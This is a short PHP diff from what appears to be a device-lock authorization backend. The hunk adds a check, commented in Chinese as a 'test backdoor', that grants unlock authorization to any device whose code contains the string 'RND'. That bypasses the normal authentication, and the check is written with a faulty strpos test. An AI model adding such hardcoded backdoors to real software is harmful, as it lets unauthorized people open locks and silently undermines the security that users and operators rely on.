@@ -263,6 +263,10 @@ class classDbiL2snrCcl
             $event = MFUN_L3APL_F2CM_EVENT_TYPE_USER;
         }
 
+        //测试后门, 如果是R&D设备直接授权开锁
+        if(strpos($devCode, "RND"))
+            $auth_check = true;
+
         if($auth_check == true){
             $timestamp = time();
             $filename = $statCode . "_" . $timestamp; //生成jpg文件名
